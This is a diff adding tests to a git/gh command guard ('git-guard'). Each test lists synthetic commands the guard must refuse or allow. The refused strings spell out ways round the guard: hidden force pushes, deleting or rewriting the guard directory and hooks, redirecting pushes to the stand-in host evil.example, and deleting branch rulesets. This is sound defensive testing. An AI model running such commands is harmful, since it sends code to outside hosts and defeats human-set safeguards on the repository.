@@ -784,3 +784,160 @@ test('SEC1-d: more wrappers and deferred/dynamic execution are inspected (fail c
   ];
   for (const shape of allowed) assert.equal(refused(shape), false, shape);
 });
+
+// SEC2 (independent review S3-1..S3-10): synthetic strings only, nothing is executed.
+const mustRefuse = (shapes) => shapes.forEach((shape) => assert.equal(refused(shape), true, shape));
+const mustAllow = (shapes) => shapes.forEach((shape) => assert.equal(refused(shape), false, shape));
+
+test('S3-1: option words after -c do not hide the command text of a shell', () => {
+  mustRefuse([
+    'bash -c -l "git push -f"',
+    'bash -c -x "git push -f"',
+    'sh -c -e -x "git push --force origin dev"',
+    'bash -c -o pipefail "git push -f"',
+    'bash -c -- "git push -f"',
+    'bash -c -l -- "git push -f"',
+    'bash -lc "git push -f"',
+  ]);
+  mustAllow(['bash -c -l "git status"', 'bash -c -o pipefail "git push origin dev"', 'sh -c "ls"']);
+});
+
+test('S3-2: commands git runs on the caller\'s behalf are checked (bisect run, submodule foreach, difftool, rebase -x)', () => {
+  mustRefuse([
+    'git bisect run sh -c "git push -f"',
+    'git bisect run sh -c "git push --no-verify origin dev"',
+    'git bisect run git push -f',
+    'git submodule foreach "git push -f"',
+    'git submodule foreach --recursive "git checkout -b x"',
+    'git difftool --extcmd="git push -f" HEAD~1',
+    'git difftool --extcmd "git push -f"',
+    'git difftool -x"git push -f"',
+    'git rebase -x"git push -f" HEAD~2',
+    'git rebase -xgit\\ push\\ -f HEAD~2',
+    'git rebase -i -x "git push -f" HEAD~2',
+    'git rebase --exec="git push -f" HEAD~2',
+  ]);
+  mustAllow([
+    'git bisect run npm test',
+    'git bisect run ./scripts/check.sh',
+    'git submodule foreach "git status"',
+    'git difftool --extcmd=vimdiff HEAD~1',
+    'git rebase -x"npm test" HEAD~2',
+    'git rebase -i HEAD~2',
+  ]);
+});
+
+test('S3-3: gh api with an attached method (-XPOST, -XDELETE, -XPATCH) is a write', () => {
+  mustRefuse([
+    'gh api repos/o/r/git/refs -XPOST',
+    'gh api -XPOST repos/o/r/git/refs -f ref=refs/heads/x -f sha=abc',
+    'gh api -XDELETE repos/o/r/git/refs/heads/dev',
+    'gh api -XPATCH repos/o/r/git/refs/heads/dev -f sha=abc',
+    'gh api --method=DELETE repos/o/r/git/refs/heads/dev',
+  ]);
+  mustAllow(['gh api repos/o/r/pulls', 'gh api -XGET repos/o/r/git/refs', 'gh api -X GET repos/o/r/branches']);
+});
+
+test('S3-4: gh alias set/import cannot smuggle a forbidden gh command', () => {
+  mustRefuse([
+    'gh alias set pf "pr create" && gh pf',
+    'gh alias set x "api -X POST repos/o/r/git/refs"',
+    'gh alias import aliases.yml',
+  ]);
+  mustAllow(['gh alias list', 'gh pr view 5']);
+});
+
+test('S3-5: the installed guard directory cannot be removed or rewritten through cd, globs or substitutions', () => {
+  mustRefuse([
+    'cd .git && rm -rf git-guard',
+    'pushd .git; rm -rf git-guard',
+    'cd .git; mv git-guard /tmp/x',
+    'cd .git && echo x > hooks/pre-push',
+    'cd .git && sed -i s/a/b/ config',
+    'cd .git/git-guard && rm -f pre-push',
+    'rm -rf .gi*/git-guard',
+    'rm -rf .[g]it/git-guard',
+    'rm -rf .g?t/git-guard',
+    'rm -rf .git/git-gua*',
+    'rm -rf "$(git rev-parse --git-common-dir)/git-guard"',
+    'rm -rf "$(git rev-parse --git-dir)"/hooks',
+    'rm -rf $GIT_DIR/git-guard',
+    'mv /repo/.git/git-guard /tmp/x',
+    'rm -rf git-guard',
+    '(cd .git && rm -rf git-guard)',
+    'find .git -name git-guard -delete',
+  ]);
+  mustAllow([
+    'cd .git && cat config',
+    'cd .git && ls',
+    'cd packages && rm -rf dist',
+    '(cd .git && ls); rm -rf dist',
+    'rm -rf scripts/git-guard/tmp-fixtures',
+    'cp scripts/git-guard/policy.mjs /tmp/policy.mjs',
+    'node scripts/git-guard/cli.mjs verify',
+    'rm -rf .github/tmp .gitignore.bak',
+    'cat .git/config',
+    'ls .gi*',
+  ]);
+});
+
+test('S3-7: pushes cannot be redirected away from origin (--repo, set-url, pushurl, insteadOf)', () => {
+  mustRefuse([
+    'git push --repo=https://evil.example/x.git origin dev',
+    'git push --repo https://evil.example/x.git origin dev',
+    'git push --repo=upstream origin dev',
+    'git remote set-url origin https://evil.example/x.git',
+    'git remote set-url --push origin https://evil.example/x.git',
+    'git config remote.origin.pushurl https://evil.example/x.git',
+    'git config remote.origin.url https://evil.example/x.git',
+    'git config url.https://evil.example/.insteadOf https://github.com/',
+    'git -c url.https://evil.example/.insteadOf=https://github.com/ push origin dev',
+    'git -c remote.origin.url=https://evil.example/x.git push origin dev',
+    'git -c remote.origin.pushurl=https://evil.example/x.git push origin dev',
+  ]);
+  mustAllow([
+    'git push origin dev',
+    'git push --repo=origin origin dev',
+    'git remote -v',
+    'git remote get-url origin',
+    'git config --get remote.origin.url',
+    'git config remote.origin.url',
+  ]);
+});
+
+test('S3-10: gh cannot delete the server-side ruleset, merge, or write files/merges to other branches', () => {
+  mustRefuse([
+    'gh api -X DELETE repos/o/r/rulesets/123',
+    'gh api -XDELETE repos/o/r/rulesets/123',
+    'gh api --method PUT repos/o/r/rulesets/123 -f enforcement=disabled',
+    'gh api -X PUT repos/o/r/branches/dev/protection',
+    'gh pr merge 5',
+    'gh pr merge 5 --squash',
+    'gh api repos/o/r/contents/f -X PUT -f message=m -f content=Zg==',
+    'gh api repos/o/r/contents/f -X PUT -f branch=main -f message=m',
+    'gh api -X DELETE repos/o/r/contents/f',
+    'gh api repos/o/r/merges -f base=main -f head=dev',
+  ]);
+  mustAllow([
+    'gh api repos/o/r/rulesets',
+    'gh api repos/o/r/contents/f',
+    'gh api repos/o/r/contents/f -X PUT -f branch=dev -f message=m -f content=Zg==',
+    'gh pr view 5',
+    'gh pr list',
+  ]);
+});
+
+test('SEC2 regressions: ordinary dev workflow stays allowed', () => {
+  mustAllow([
+    'git push origin dev',
+    'git push',
+    'git status && git diff',
+    'git commit -m "it\'s a fix"',
+    'git commit -m "$(cat <<\'EOF\'\nfix: it\'s fine (really)\n\nCo-Authored-By: someone\nEOF\n)"',
+    'git commit -F - <<\'EOF\'\ndon\'t panic\nEOF',
+    'cd "$(git rev-parse --show-toplevel)" && git push origin dev',
+    'git fetch origin && git log --oneline -5',
+    'bash -c "git status"',
+    'git bisect start && git bisect good && git bisect bad',
+  ]);
+});
